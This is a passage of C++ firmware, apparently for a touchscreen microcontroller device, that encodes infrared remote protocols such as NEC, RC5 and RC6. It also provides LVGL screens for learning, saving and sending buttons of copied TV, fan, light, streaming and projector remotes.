          !append_ir_rmt_run(runs, run_count, HIGH, 889)) return false;
    } else {
      if (!append_ir_rmt_run(runs, run_count, HIGH, 889) ||
          !append_ir_rmt_run(runs, run_count, LOW, 889)) return false;
    }
  }
  if (!append_ir_rmt_run(runs, run_count, LOW, 10000)) return false;
  return send_ir_rmt_runs(runs, run_count);
}


bool send_rc6_rmt(const SavedIrRemoteCommand &command) {
  ir_rc6_toggle = !ir_rc6_toggle;
  // RC6 mode 0: three leading mode bits are zero, followed by the toggle,
  // eight address bits, and eight command bits.
  uint32_t data = (uint32_t)(command.command & 0xFF) |
                  ((uint32_t)(command.address & 0xFF) << 8);
  if (ir_rc6_toggle) data |= 1UL << 16;

  IrRmtRun runs[56] = {};
  uint8_t run_count = 0;
  if (!append_ir_rmt_run(runs, run_count, HIGH, 2666) ||
      !append_ir_rmt_run(runs, run_count, LOW, 889) ||
      !append_ir_rmt_run(runs, run_count, HIGH, 444) ||
      !append_ir_rmt_run(runs, run_count, LOW, 444)) return false;

  for (int8_t bit = 19; bit >= 0; bit--) {
    const uint16_t unit = bit == 16 ? 888 : 444;
    const bool one = ((data >> bit) & 1UL) != 0;
    if (one) {
      if (!append_ir_rmt_run(runs, run_count, HIGH, unit) ||
          !append_ir_rmt_run(runs, run_count, LOW, unit)) return false;
    } else {
      if (!append_ir_rmt_run(runs, run_count, LOW, unit) ||
          !append_ir_rmt_run(runs, run_count, HIGH, unit)) return false;
    }
  }
  if (!append_ir_rmt_run(runs, run_count, LOW, 2666)) return false;
  return send_ir_rmt_runs(runs, run_count);
}


bool send_saved_ir_command(const SavedIrRemoteCommand &command) {
  if (!ir_transmitter_ready || !command.valid) return false;

  bool sent = false;
  if (command.protocol == NEC || command.protocol == NEC2) {
    uint32_t raw = (uint32_t)command.raw_data;
    if (raw == 0) {
      uint8_t code = command.command & 0xFF;
      if (command.address > 0xFF) {
        // NEC extended sends the complete 16-bit address, followed by the
        // command byte and its inverse.  This is used by several projector
        // profiles and must not be reduced to an 8-bit NEC address.
        raw = (uint32_t)command.address | ((uint32_t)code << 16) |
              ((uint32_t)(uint8_t)~code << 24);
      } else {
        uint8_t address = command.address & 0xFF;
        raw = (uint32_t)address | ((uint32_t)(uint8_t)~address << 8) |
              ((uint32_t)code << 16) | ((uint32_t)(uint8_t)~code << 24);
      }
    }
    sent = send_nec_rmt(raw);
  } else if (command.protocol == ONKYO) {
    uint32_t raw = (uint32_t)command.raw_data;
    if (raw == 0) {
      raw = (uint32_t)command.address | ((uint32_t)command.command << 16);
    }
    sent = send_nec_rmt(raw);
  } else if (command.protocol == APPLE) {
    uint32_t raw = (uint32_t)command.raw_data;
    if (raw == 0) {
      raw = 0x000087EEUL | ((uint32_t)(command.command & 0xFF) << 16) |
            ((uint32_t)(command.address & 0xFF) << 24);
    }
    sent = send_nec_rmt(raw);
  } else if (command.protocol == SAMSUNG || command.protocol == SAMSUNGLG) {
    sent = send_samsung_rmt((uint32_t)command.raw_data);
  } else if (command.protocol == SONY) {
    sent = send_sony_rmt((uint32_t)command.raw_data, command.bits);
  } else if (command.protocol == JVC) {
    sent = send_jvc_rmt((uint16_t)command.raw_data);
  } else if (command.protocol == LG) {
    sent = send_lg_rmt(command);
  } else if (command.protocol == PANASONIC) {
    sent = send_kaseikyo_rmt(command, 0x2002);
  } else if (command.protocol == KASEIKYO) {
    sent = send_kaseikyo_rmt(command, command.extra);
  } else if (command.protocol == KASEIKYO_DENON) {
    sent = send_kaseikyo_rmt(command, 0x3254);
  } else if (command.protocol == KASEIKYO_SHARP) {
    sent = send_kaseikyo_rmt(command, 0x5AAA);
  } else if (command.protocol == KASEIKYO_JVC) {
    sent = send_kaseikyo_rmt(command, 0x0103);
  } else if (command.protocol == KASEIKYO_MITSUBISHI) {
    sent = send_kaseikyo_rmt(command, 0xCB23);
  } else if (command.protocol == DENON) {
    sent = send_denon_or_sharp_rmt(command, false);
  } else if (command.protocol == SHARP) {
    sent = send_denon_or_sharp_rmt(command, true);
  } else if (command.protocol == RC5) {
    sent = send_rc5_rmt(command);
  } else if (command.protocol == RC6) {
    sent = send_rc6_rmt(command);
  }

  return sent;
}


void process_pending_ir_send() {
  if (!ir_pending_send_requested) return;
  ir_pending_send_requested = false;
  int8_t pending_index = ir_pending_send_index;
  ir_pending_send_index = -1;
  if (pending_index < 0 || pending_index >= ir_working_remote.button_count) return;

  uint8_t index = (uint8_t)pending_index;
  const SavedIrRemoteCommand &command = ir_working_remote.buttons[index];
  set_status("TRANSMITTING", COLOR_IR);
  bool sent = send_saved_ir_command(command);

  if (sent) {
    Serial.printf("IR remote sent: %s\n", ir_working_remote.button_names[index]);
    set_status("TRANSMITTING", COLOR_IR);
  } else {
    Serial.printf("IR remote command cannot be sent: %s\n", ir_working_remote.button_names[index]);
    set_status("IR COMMAND NOT SUPPORTED", COLOR_RED);
  }
}


// Run a saved-command send after LVGL finishes the touch callback.  Keeping
// this entirely out of loop() is important: a startup memory value must never
// be able to trigger a transmitter action.
void send_ir_working_button_async(void *user_data) {
  ir_pending_send_index = (int8_t)(uintptr_t)user_data;
  ir_pending_send_requested = true;
  process_pending_ir_send();
}


void ir_send_working_button(lv_event_t *e) {
  uint8_t index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (index >= ir_working_remote.button_count) return;

  if (ir_volume_hold_consumed_click && index == (uint8_t)ir_volume_hold_index) {
    ir_volume_hold_consumed_click = false;
    return;
  }

  // LVGL owns this callback while it is changing the button's pressed state.
  // Defer the RMT transmission until that operation has completed.
  lv_async_call(send_ir_working_button_async, (void *)(uintptr_t)index);
}


bool is_volume_button(uint8_t index) {
  if (index >= ir_working_remote.button_count) return false;
  const char *name = ir_working_remote.button_names[index];
  return strcmp(name, "VOLUME UP") == 0 || strcmp(name, "VOLUME DOWN") == 0;
}


void begin_ir_volume_hold(lv_event_t *e) {
  const uint8_t index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (!is_volume_button(index)) return;
  ir_volume_hold_active = true;
  ir_volume_hold_index = (int8_t)index;
  ir_volume_hold_consumed_click = true;
  ir_volume_hold_last_send_ms = 0;
  set_status("TRANSMITTING", COLOR_IR);
}


void end_ir_volume_hold(lv_event_t *e) {
  const uint8_t index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (index == (uint8_t)ir_volume_hold_index) {
    ir_volume_hold_active = false;
    // A cancelled touch has no following CLICKED event to consume.
    if (lv_event_get_code(e) == LV_EVENT_PRESS_LOST) {
      ir_volume_hold_consumed_click = false;
    }
  }
}


void service_ir_volume_hold() {
  if (!ir_volume_hold_active || ir_volume_hold_index < 0 ||
      !is_volume_button((uint8_t)ir_volume_hold_index)) return;
  if ((uint32_t)(millis() - ir_volume_hold_last_send_ms) < 260) return;

  ir_volume_hold_last_send_ms = millis();
  const SavedIrRemoteCommand &command = ir_working_remote.buttons[ir_volume_hold_index];
  if (send_saved_ir_command(command)) {
    set_status("TRANSMITTING", COLOR_IR);
  } else {
    ir_volume_hold_active = false;
    set_status("IR COMMAND NOT SUPPORTED", COLOR_RED);
  }
}


void refresh_ir_remote_builder() {
  if (ir_remote_builder_screen == NULL) return;

  forget_status_indicators_for(ir_remote_builder_screen);
  lv_obj_clean(ir_remote_builder_screen);
  create_header(ir_remote_builder_screen, "IR REMOTE");

  lv_obj_t *remote_name = lv_label_create(ir_remote_builder_screen);
  lv_label_set_text(remote_name, ir_working_remote.name[0] ? ir_working_remote.name : "NEW IR REMOTE");
  lv_obj_set_style_text_color(remote_name, lv_color_hex(COLOR_IR), LV_PART_MAIN);
  lv_obj_set_style_text_font(remote_name, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(remote_name, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(remote_name, LV_ALIGN_TOP_MID, 0, 76);

  lv_obj_t *remote_list = lv_obj_create(ir_remote_builder_screen);
  lv_obj_set_size(remote_list, 290, ir_working_remote_from_save ? 240 : 150);
  lv_obj_set_pos(remote_list, 15, ir_working_remote_from_save ? 96 : 100);
  lv_obj_set_style_pad_all(remote_list, 5, LV_PART_MAIN);
  lv_obj_set_style_bg_color(remote_list, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(remote_list, lv_color_hex(COLOR_IR), LV_PART_MAIN);
  lv_obj_set_style_border_width(remote_list, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(remote_list, 10, LV_PART_MAIN);
  lv_obj_set_scroll_dir(remote_list, LV_DIR_VER);

  if (ir_working_remote.button_count == 0) {
    lv_obj_t *empty = lv_label_create(remote_list);
    lv_label_set_text(empty, "No learned buttons yet.");
    lv_obj_set_style_text_color(empty, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_center(empty);
  } else {
    int y = 5;
    uint8_t unknown_button_count = 0;
    for (uint8_t i = 0; i < ir_working_remote.button_count; i++) {
      char label[42];
      lv_obj_t *button = NULL;
      if (ir_working_remote_from_save) {
        int tile_x, tile_y, tile_w, tile_h;
        bool is_unknown = !get_virtual_remote_button_bounds(ir_working_remote.button_names[i],
                                                             tile_x, tile_y, tile_w, tile_h);
        get_saved_layout_button_bounds(true, selected_ir_saved_index, i,
                                       ir_working_remote.button_names[i], unknown_button_count,
                                       tile_x, tile_y, tile_w, tile_h);
        if (is_unknown) unknown_button_count++;
        button = create_button(remote_list, tile_x, tile_y, tile_w, tile_h,
                               get_virtual_remote_button_display_text(ir_working_remote.button_names[i]),
                               COLOR_IR, NULL);
        style_virtual_remote_button_label(button, tile_w);
      } else {
        snprintf(label, sizeof(label), "%s  > SEND", ir_working_remote.button_names[i]);
        button = create_button(remote_list, 8, y, 264, 34, label, COLOR_IR, NULL);
        y += 40;
      }
      lv_obj_add_event_cb(button, ir_send_working_button, LV_EVENT_CLICKED, (void *)(uintptr_t)i);
      if (ir_working_remote_from_save && is_volume_button(i)) {
        lv_obj_add_event_cb(button, begin_ir_volume_hold, LV_EVENT_LONG_PRESSED,
                            (void *)(uintptr_t)i);
        lv_obj_add_event_cb(button, end_ir_volume_hold, LV_EVENT_RELEASED,
                            (void *)(uintptr_t)i);
        lv_obj_add_event_cb(button, end_ir_volume_hold, LV_EVENT_PRESS_LOST,
                            (void *)(uintptr_t)i);
      }
    }
  }

  if (ir_working_remote_from_save) {
    lv_obj_t *read_only = lv_label_create(ir_remote_builder_screen);
    lv_label_set_text(read_only, "Tap command to send");
    lv_obj_set_style_text_color(read_only, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_align(read_only, LV_ALIGN_TOP_MID, 0, 340);
    create_button(ir_remote_builder_screen, 10, 370, 88, 38, "LAYOUT", COLOR_IR,
                  open_ir_remote_layout_editor);
    create_button(ir_remote_builder_screen, 116, 370, 88, 38, "SAVED", COLOR_SAVED, open_saved);
    create_button(ir_remote_builder_screen, 222, 370, 88, 38, "IR", COLOR_IR, open_ir);
  } else {
    char learn_label[42];
    snprintf(learn_label, sizeof(learn_label), "LEARN: %s", ir_button_label_choices[ir_next_button_label_index]);
    create_button(ir_remote_builder_screen, 30, 264, 260, 34, learn_label, COLOR_GREEN, start_ir_button_learn);
    create_button(ir_remote_builder_screen, 65, 306, 190, 30, "NEXT BUTTON LABEL", COLOR_SETTINGS, next_ir_button_label);
    create_button(ir_remote_builder_screen, 10, 352, 95, 38, "CANCEL", COLOR_RED, open_saved);
    create_button(ir_remote_builder_screen, 113, 352, 95, 38, "SAVE", COLOR_GREEN, save_ir_working_remote);
    create_button(ir_remote_builder_screen, 215, 352, 95, 38, "IR MENU", COLOR_IR, open_ir);
  }
  create_footer(ir_remote_builder_screen);
}


void ensure_ir_remote_builder_screen() {
  if (ir_remote_builder_screen == NULL) {
    ir_remote_builder_screen = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(ir_remote_builder_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(ir_remote_builder_screen, LV_OPA_COVER, LV_PART_MAIN);
  }
}


void open_ir_saved(lv_event_t *e) {
  if (ir_saved_screen == NULL) create_ir_saved_screen();
  refresh_ir_saved_summary();
  lv_scr_load(ir_saved_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void select_next_ir_saved_remote(lv_event_t *e) {
  if (saved_ir_remote_count == 0) {
    set_status("NO SAVED IR REMOTES", COLOR_MUTED);
    return;
  }
  selected_ir_saved_index = (selected_ir_saved_index + 1) % saved_ir_remote_count;
  refresh_ir_saved_summary();
}


void open_selected_ir_remote(lv_event_t *e) {
  if (saved_ir_remote_count == 0) {
    set_status("NO SAVED IR REMOTES", COLOR_MUTED);
    return;
  }
  if (selected_ir_saved_index < 0 || selected_ir_saved_index >= saved_ir_remote_count) {
    selected_ir_saved_index = 0;
  }
  ir_working_remote = saved_ir_remotes[selected_ir_saved_index];
  ir_working_remote_from_save = true;
  ensure_ir_remote_builder_screen();
  refresh_ir_remote_builder();
  lv_scr_load(ir_remote_builder_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void delete_selected_ir_remote(lv_event_t *e) {
  if (saved_ir_remote_count == 0) {
    set_status("NO SAVED IR REMOTES", COLOR_MUTED);
    return;
  }
  if (selected_ir_saved_index < 0 || selected_ir_saved_index >= saved_ir_remote_count) {
    selected_ir_saved_index = 0;
  }
  for (uint8_t i = selected_ir_saved_index; i + 1 < saved_ir_remote_count; i++) {
    saved_ir_remotes[i] = saved_ir_remotes[i + 1];
    saved_ir_layouts[i] = saved_ir_layouts[i + 1];
  }
  saved_ir_remote_count--;
  memset(&saved_ir_layouts[saved_ir_remote_count], 0, sizeof(SavedRemoteLayout));
  if (selected_ir_saved_index >= saved_ir_remote_count) {
    selected_ir_saved_index = saved_ir_remote_count ? saved_ir_remote_count - 1 : -1;
  }
  persist_saved_ir_remotes();
  persist_saved_remote_layouts();
  refresh_ir_saved_summary();
  set_status("SYSTEM READY", COLOR_READY);
}


void start_new_ir_remote(lv_event_t *e) {
  if (saved_ir_remote_count >= MAX_IR_SAVED_REMOTES) {
    set_status("SAVED IR REMOTES FULL", COLOR_RED);
    return;
  }
  memset(&ir_working_remote, 0, sizeof(ir_working_remote));
  ir_working_remote.magic = SAVED_IR_REMOTE_MAGIC;
  ir_working_remote_from_save = false;
  ir_guided_copy_active = false;
  ir_name_saves_guided_copy = false;
  ir_name_saves_discovery_anchor = false;
  ir_next_button_label_index = 0;
  if (ir_remote_name_screen == NULL) create_ir_remote_name_screen();
  lv_textarea_set_text(ir_remote_name_textarea, "");
  lv_scr_load(ir_remote_name_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void commit_ir_remote_name(lv_event_t *e) {
  const char *entered_name = lv_textarea_get_text(ir_remote_name_textarea);
  if (strlen(entered_name) == 0) {
    snprintf(ir_working_remote.name, sizeof(ir_working_remote.name), "IR REMOTE %d", saved_ir_remote_count + 1);
  } else {
    strncpy(ir_working_remote.name, entered_name, sizeof(ir_working_remote.name) - 1);
    ir_working_remote.name[sizeof(ir_working_remote.name) - 1] = '\0';
  }
  if (ir_name_saves_guided_copy || ir_name_saves_discovery_anchor) {
    ir_name_saves_guided_copy = false;
    ir_name_saves_discovery_anchor = false;
    ir_guided_copy_active = false;
    save_ir_working_remote(e);
    return;
  }
  ensure_ir_remote_builder_screen();
  refresh_ir_remote_builder();
  lv_scr_load(ir_remote_builder_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void next_ir_button_label(lv_event_t *e) {
  ir_next_button_label_index = (ir_next_button_label_index + 1) % IR_BUTTON_LABEL_CHOICE_COUNT;
  refresh_ir_remote_builder();
}


void start_ir_button_learn(lv_event_t *e) {
  if (!ir_receiver_ready) {
    set_status("IR RECEIVER NOT READY", COLOR_RED);
    return;
  }
  if (ir_working_remote.button_count >= MAX_IR_REMOTE_BUTTONS) {
    set_status("IR REMOTE FULL", COLOR_RED);
    return;
  }
  ir_receiver_test_active = true;
  ir_power_learn_active = false;
  ir_remote_learn_active = true;
  ir_receiver_test_started_ms = millis();
  ir_receiver_test_result = -1;
  if (ir_learn_screen == NULL) create_ir_learn_screen();
  const char *button_name = ir_guided_copy_active ?
    ir_guided_steps[ir_guided_step_index] :
    ir_button_label_choices[ir_next_button_label_index];
  lv_label_set_text_fmt(ir_learn_state_label, "LEARNING %s\n\nPress that button once on\nthe original remote.", button_name);
  lv_scr_load(ir_learn_screen);
  set_status("LISTENING", COLOR_IR);
  Serial.printf("IR remote learn: press %s within 5 seconds\n", button_name);
}


void cancel_ir_button_learn(lv_event_t *e) {
  ir_receiver_test_active = false;
  ir_power_learn_active = false;
  ir_remote_learn_active = false;
  if (ir_guided_copy_active) {
    refresh_ir_guided_copy_screen();
    lv_scr_load(ir_guided_copy_screen);
  } else {
    refresh_ir_remote_builder();
    lv_scr_load(ir_remote_builder_screen);
  }
  set_status("SYSTEM READY", COLOR_READY);
}


void save_ir_working_remote(lv_event_t *e) {
  if (ir_working_remote.button_count == 0) {
    set_status("LEARN A BUTTON FIRST", COLOR_RED);
    return;
  }
  if (saved_ir_remote_count >= MAX_IR_SAVED_REMOTES) {
    set_status("SAVED IR REMOTES FULL", COLOR_RED);
    return;
  }
  uint8_t saved_index = saved_ir_remote_count;
  saved_ir_remotes[saved_ir_remote_count++] = ir_working_remote;
  memset(&saved_ir_layouts[saved_index], 0, sizeof(SavedRemoteLayout));
  selected_ir_saved_index = saved_ir_remote_count - 1;
  persist_saved_ir_remotes();
  persist_saved_remote_layouts();
  refresh_ir_saved_summary();
  open_saved(e);
  Serial.printf("IR remote saved: %s\n", ir_working_remote.name);
}


void create_ir_saved_screen() {
  ir_saved_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_saved_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_saved_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(ir_saved_screen, "IR SAVED REMOTES");

  ir_saved_summary_label = lv_label_create(ir_saved_screen);
  lv_obj_set_style_text_color(ir_saved_summary_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(ir_saved_summary_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(ir_saved_summary_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(ir_saved_summary_label, LV_ALIGN_CENTER, 0, -65);

  create_button(ir_saved_screen, 45, 250, 230, 30, "NEXT SAVED IR REMOTE", COLOR_IR, select_next_ir_saved_remote);
  create_button(ir_saved_screen, 45, 286, 230, 30, "OPEN SELECTED", COLOR_GREEN, open_selected_ir_remote);
  create_button(ir_saved_screen, 45, 322, 230, 30, "CREATE NEW IR REMOTE", COLOR_IR, start_new_ir_remote);
  create_button(ir_saved_screen, 45, 358, 230, 30, "DELETE SELECTED", COLOR_RED, delete_selected_ir_remote);
  create_button(ir_saved_screen, 70, 400, 180, 28, "BACK TO SAVED", COLOR_SAVED, open_saved);
  create_footer(ir_saved_screen);
  refresh_ir_saved_summary();
}


void create_ir_remote_name_screen() {
  ir_remote_name_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_remote_name_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_remote_name_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(ir_remote_name_screen, "NAME IR REMOTE");

  ir_remote_name_textarea = lv_textarea_create(ir_remote_name_screen);
  lv_textarea_set_one_line(ir_remote_name_textarea, true);
  lv_textarea_set_placeholder_text(ir_remote_name_textarea, "Remote name");
  lv_obj_set_size(ir_remote_name_textarea, 260, 42);
  lv_obj_align(ir_remote_name_textarea, LV_ALIGN_TOP_MID, 0, 105);

  lv_obj_t *keyboard = lv_keyboard_create(ir_remote_name_screen);
  lv_keyboard_set_textarea(keyboard, ir_remote_name_textarea);
  lv_obj_set_size(keyboard, 320, 170);
  lv_obj_align(keyboard, LV_ALIGN_TOP_MID, 0, 155);

  create_button(ir_remote_name_screen, 35, 345, 120, 40, "CONTINUE", COLOR_GREEN, commit_ir_remote_name);
  create_button(ir_remote_name_screen, 165, 345, 120, 40, "CANCEL", COLOR_RED, open_ir_saved);
  create_footer(ir_remote_name_screen);
}


void commit_ir_custom_button_name(lv_event_t *e) {
  if (ir_pending_custom_button_index < 0 ||
      ir_pending_custom_button_index >= ir_working_remote.button_count) {
    return;
  }
  const char *entered_name = lv_textarea_get_text(ir_custom_button_name_textarea);
  if (strlen(entered_name) == 0) {
    snprintf(ir_working_remote.button_names[ir_pending_custom_button_index],
             sizeof(ir_working_remote.button_names[ir_pending_custom_button_index]),
             "BUTTON %d", ir_pending_custom_button_index + 1);
  } else {
    strncpy(ir_working_remote.button_names[ir_pending_custom_button_index], entered_name,
            sizeof(ir_working_remote.button_names[ir_pending_custom_button_index]) - 1);
    ir_working_remote.button_names[ir_pending_custom_button_index][sizeof(ir_working_remote.button_names[ir_pending_custom_button_index]) - 1] = '\0';
  }
  ir_pending_custom_button_index = -1;
  ensure_ir_remote_builder_screen();
  refresh_ir_remote_builder();
  lv_scr_load(ir_remote_builder_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void create_ir_custom_button_name_screen() {
  ir_custom_button_name_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_custom_button_name_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_custom_button_name_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(ir_custom_button_name_screen, "NAME IR BUTTON");

  ir_custom_button_name_textarea = lv_textarea_create(ir_custom_button_name_screen);
  lv_textarea_set_one_line(ir_custom_button_name_textarea, true);
  lv_textarea_set_placeholder_text(ir_custom_button_name_textarea, "Button name");
  lv_obj_set_size(ir_custom_button_name_textarea, 260, 42);
  lv_obj_align(ir_custom_button_name_textarea, LV_ALIGN_TOP_MID, 0, 105);

  lv_obj_t *keyboard = lv_keyboard_create(ir_custom_button_name_screen);
  lv_keyboard_set_textarea(keyboard, ir_custom_button_name_textarea);
  lv_obj_set_size(keyboard, 320, 170);
  lv_obj_align(keyboard, LV_ALIGN_TOP_MID, 0, 155);

  create_button(ir_custom_button_name_screen, 35, 345, 120, 40, "SAVE", COLOR_GREEN, commit_ir_custom_button_name);
  create_button(ir_custom_button_name_screen, 165, 345, 120, 40, "CANCEL", COLOR_RED, cancel_ir_button_learn);
  create_footer(ir_custom_button_name_screen);
}


void create_ir_learn_screen() {
  ir_learn_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_learn_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_learn_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(ir_learn_screen, "LEARN IR BUTTON");

  ir_learn_state_label = lv_label_create(ir_learn_screen);
  lv_obj_set_style_text_color(ir_learn_state_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(ir_learn_state_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_set_style_text_align(ir_learn_state_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(ir_learn_state_label, LV_ALIGN_TOP_MID, 0, 150);

  create_button(ir_learn_screen, 70, 350, 180, 40, "CANCEL", COLOR_RED, cancel_ir_button_learn);
  create_footer(ir_learn_screen);
}


void refresh_ir_guided_copy_screen() {
  if (ir_guided_instruction_label == NULL || ir_guided_progress_label == NULL) return;

  if (ir_guided_step_index >= ir_guided_step_count) {
    lv_label_set_text(ir_guided_instruction_label, "COPY COMPLETE\n\nName and save this remote.");
    lv_label_set_text_fmt(ir_guided_progress_label, "%d / %d COPIED",
                          ir_guided_step_count, ir_guided_step_count);
    lv_obj_add_flag(ir_guided_learn_button, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ir_guided_skip_button, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(ir_guided_finish_button, LV_OBJ_FLAG_HIDDEN);
    return;
  }

  lv_label_set_text_fmt(ir_guided_instruction_label, "PRESS %s\non the original remote", ir_guided_steps[ir_guided_step_index]);
  lv_label_set_text_fmt(ir_guided_progress_label, "%d / %d", ir_guided_step_index + 1, ir_guided_step_count);
  lv_obj_clear_flag(ir_guided_learn_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_clear_flag(ir_guided_skip_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_add_flag(ir_guided_finish_button, LV_OBJ_FLAG_HIDDEN);
}


void start_guided_ir_copy(const char *device_name, const char * const *steps, uint8_t step_count) {
  if (saved_ir_remote_count >= MAX_IR_SAVED_REMOTES) {
    set_status("SAVED IR REMOTES FULL", COLOR_RED);
    return;
  }

  memset(&ir_working_remote, 0, sizeof(ir_working_remote));
  ir_working_remote.magic = SAVED_IR_REMOTE_MAGIC;
  snprintf(ir_working_remote.name, sizeof(ir_working_remote.name), "%s REMOTE", device_name);
  ir_working_remote_from_save = false;
  ir_guided_device_name = device_name;
  ir_guided_step_count = step_count;
  ir_guided_step_index = 0;
  ir_guided_copy_active = true;
  ir_name_saves_guided_copy = false;
  for (uint8_t i = 0; i < step_count; i++) ir_guided_steps[i] = steps[i];

  if (ir_guided_copy_screen == NULL) create_ir_guided_copy_screen();
  refresh_ir_guided_copy_screen();
  lv_scr_load(ir_guided_copy_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void start_guided_tv_copy(lv_event_t *e) {
  static const char *steps[] = { "POWER", "VOLUME UP", "VOLUME DOWN", "MUTE", "INPUT", "UP", "DOWN", "LEFT", "RIGHT", "SELECT" };
  start_guided_ir_copy("TV", steps, sizeof(steps) / sizeof(steps[0]));
}


void start_guided_fan_copy(lv_event_t *e) {
  static const char *steps[] = { "POWER", "SPEED UP", "SPEED DOWN", "LIGHT", "TIMER", "OSCILLATE" };
  start_guided_ir_copy("FAN", steps, sizeof(steps) / sizeof(steps[0]));
}


void start_guided_light_copy(lv_event_t *e) {
  static const char *steps[] = { "POWER", "BRIGHTER", "DIMMER", "MODE" };
  start_guided_ir_copy("LIGHT", steps, sizeof(steps) / sizeof(steps[0]));
}


void start_guided_streaming_copy(lv_event_t *e) {
  static const char *steps[] = { "HOME", "UP", "DOWN", "LEFT", "RIGHT", "SELECT", "BACK", "PLAY / PAUSE" };
  start_guided_ir_copy("STREAMING", steps, sizeof(steps) / sizeof(steps[0]));
}


void start_guided_projector_copy(lv_event_t *e) {
  static const char *steps[] = {
    "POWER", "SOURCE", "MENU", "UP", "DOWN", "LEFT", "RIGHT", "SELECT",
    "BACK", "VOLUME UP", "VOLUME DOWN", "MUTE"
  };
  start_guided_ir_copy("PROJECTOR", steps, sizeof(steps) / sizeof(steps[0]));
}


void start_other_ir_copy(lv_event_t *e) {
  ir_guided_copy_active = false;
  ir_name_saves_guided_copy = false;
  start_new_ir_remote(e);
}


void begin_guided_ir_step(lv_event_t *e) {
  start_ir_button_learn(e);
}


void skip_guided_ir_step(lv_event_t *e) {
  if (!ir_guided_copy_active || ir_guided_step_index >= ir_guided_step_count) return;

  Serial.printf("IR remote button skipped: %s\n", ir_guided_steps[ir_guided_step_index]);
  ir_guided_step_index++;
  refresh_ir_guided_copy_screen();
  set_status("SYSTEM READY", COLOR_READY);
}


void finish_guided_ir_copy(lv_event_t *e) {
  ir_name_saves_guided_copy = true;
  if (ir_remote_name_screen == NULL) create_ir_remote_name_screen();
  lv_textarea_set_text(ir_remote_name_textarea, ir_working_remote.name);
  lv_scr_load(ir_remote_name_screen);
}


void open_ir_copy_category(lv_event_t *e) {
  if (ir_copy_category_screen == NULL) create_ir_copy_category_screen();
  lv_scr_load(ir_copy_category_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void open_ir_discovery(lv_event_t *e) {
  if (ir_discovery_category_screen == NULL) create_ir_discovery_category_screen();
  lv_scr_load(ir_discovery_category_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void open_ir_blast(lv_event_t *e) {
  if (ir_blast_screen == NULL) create_ir_blast_screen();
  refresh_ir_blast_screen();
  lv_scr_load(ir_blast_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void create_ir_copy_category_screen() {
  ir_copy_category_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_copy_category_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_copy_category_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(ir_copy_category_screen, "COPY IR REMOTE");

  lv_obj_t *info = lv_label_create(ir_copy_category_screen);
  lv_label_set_text(info, "Pick the closest device type.\nYou will learn each button in order.");
  lv_obj_set_style_text_color(info, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(info, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(info, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(info, LV_ALIGN_TOP_MID, 0, 105);

  create_button(ir_copy_category_screen, 25, 170, 130, 46, "TV", COLOR_IR, start_guided_tv_copy);
  create_button(ir_copy_category_screen, 165, 170, 130, 46, "FAN", COLOR_GREEN, start_guided_fan_copy);
  create_button(ir_copy_category_screen, 25, 226, 130, 46, "LIGHT", COLOR_SETTINGS, start_guided_light_copy);
  create_button(ir_copy_category_screen, 165, 226, 130, 46, "STREAMING", COLOR_SAVED, start_guided_streaming_copy);
  create_button(ir_copy_category_screen, 25, 282, 130, 40, "PROJECTOR", COLOR_BLUETOOTH, start_guided_projector_copy);
  create_button(ir_copy_category_screen, 165, 282, 130, 40, "OTHER / CUSTOM", COLOR_MUTED, start_other_ir_copy);
